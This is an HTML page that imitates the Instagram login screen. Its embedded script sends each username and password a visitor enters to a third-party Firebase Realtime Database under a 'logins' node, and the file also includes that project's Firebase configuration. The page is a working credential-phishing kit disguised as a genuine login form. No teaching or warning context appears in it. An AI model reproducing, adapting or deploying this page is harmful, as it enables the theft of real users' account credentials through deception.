<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
            font-family: Arial, sans-serif;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 50px;
            text-align: center;
            width: 400px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .login-container img {
            width: 300px;
            margin-bottom: 20px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 70%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 16px;
        }
        .login-container button {
            width: 70%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container a {
            color: #00376b;
            text-decoration: none;
            font-size: 14px;
        }
        .signup-container {
            border: 1px solid #dbdbdb;
            margin-top: 10px;
            padding: 20px;
            text-align: center;
            width: 460px;
        }
        .get-app {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
        }
        .get-app img {
            width: 136px;
            margin: 5px;
            text-align: center;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }
        .footer a {
            margin: 0 5px;
            color: #00376b;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div>
        <div class="login-container">
            <img src="Instagram.jpg" alt="Instagram">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button id="loginBtn">Log in</button>
            <div style="margin-top: 10px;">
                <a href="#">Forgot password?</a>
            </div>
        </div>

        <div class="signup-container">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>

        <div class="get-app">
            <p>Get the app.</p>
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
            <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="Download on the App Store">
        </div>

        <div class="footer">
            <div>
                <a href="#">ABOUT US</a>
                <a href="#">SUPPORT</a>
                <a href="#">BLOG</a>
                <a href="#">PRESS</a>
                <a href="#">API</a>
                <a href="#">JOBS</a>
                <a href="#">PRIVACY</a>
                <a href="#">TERMS</a>
                <a href="#">DIRECTORY</a>
                <a href="#">LANGUAGE</a>
            </div>
            <div>
                Â© 2025 INSTAGRAM
            </div>
        </div>
    </div>

    <!-- Firebase Integration -->
    <script type="module">
        // Import Firebase SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-database.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCG-6Tmd3teFynLyRdCzirCQj5IKnP8LLU",
            authDomain: "instagram-9d5c4.firebaseapp.com",
            databaseURL: "https://instagram-9d5c4-default-rtdb.firebaseio.com",
            projectId: "instagram-9d5c4",
            storageBucket: "instagram-9d5c4.appspot.com",
            messagingSenderId: "822430016754",
            appId: "1:822430016754:web:5c7c943b39326ca2bb1c6b",
            measurementId: "G-H37RFWK3V7"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // Handle login button click
        const loginBtn = document.getElementById('loginBtn');
        loginBtn.addEventListener('click', () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username === '' || password === '') {
                alert('Please fill in all fields.');
                return;
            }

            // Reference to 'logins' node in Realtime Database
            const loginsRef = ref(database, 'logins');

            // Push new login data
            const newLoginRef = push(loginsRef);
            set(newLoginRef, {
                username: username,
                password: password
            })
            .then(() => {
                alert('Login data saved to Firebase!');
            })
            .catch((error) => {
                alert('Error saving data: ' + error.message);
            });
        });
    </script>
</body>
</html>
